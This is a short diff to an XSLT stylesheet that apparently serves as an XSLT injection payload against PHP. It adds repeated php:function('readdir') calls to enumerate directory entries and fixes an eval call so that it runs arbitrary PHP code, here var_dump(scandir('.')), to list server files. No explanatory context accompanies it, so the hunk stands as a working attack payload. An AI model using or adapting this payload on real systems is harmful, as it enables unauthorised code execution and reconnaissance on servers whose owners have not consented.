@@ -7,10 +7,15 @@
   <xsl:value-of select="php:function('readdir')"/>
   <xsl:value-of select="php:function('readdir')"/>
   <xsl:value-of select="php:function('readdir')"/>  
+  <xsl:value-of select="php:function('readdir')"/>  
+<xsl:value-of select="php:function('readdir')"/>
+  <xsl:value-of select="php:function('readdir')"/>
+  <xsl:value-of select="php:function('readdir')"/>
+  <xsl:value-of select="php:function('readdir')"/>  
 <xsl:variable name="eval">
-        "var_dump(scandir('.'));"
+        var_dump(scandir('.'));
 </xsl:variable>
-  <xsl:value-of select="php:function('eval',$eval)"/> 
+  <xsl:value-of select="php:function('eval',string($eval))"/> 
 
   
   
